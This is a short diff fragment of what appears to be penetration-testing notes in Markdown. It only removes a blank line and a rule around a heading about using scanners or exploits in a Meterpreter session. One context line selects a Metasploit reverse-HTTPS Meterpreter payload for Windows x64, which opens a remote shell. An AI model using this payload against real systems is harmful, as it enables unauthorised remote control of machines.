@@ -1,6 +1,3 @@
-
----
-
 ### Use Scanners/Exploit in meterpreter session
 set payload windows/x64/meterpreter/reverse_https
 ```sh
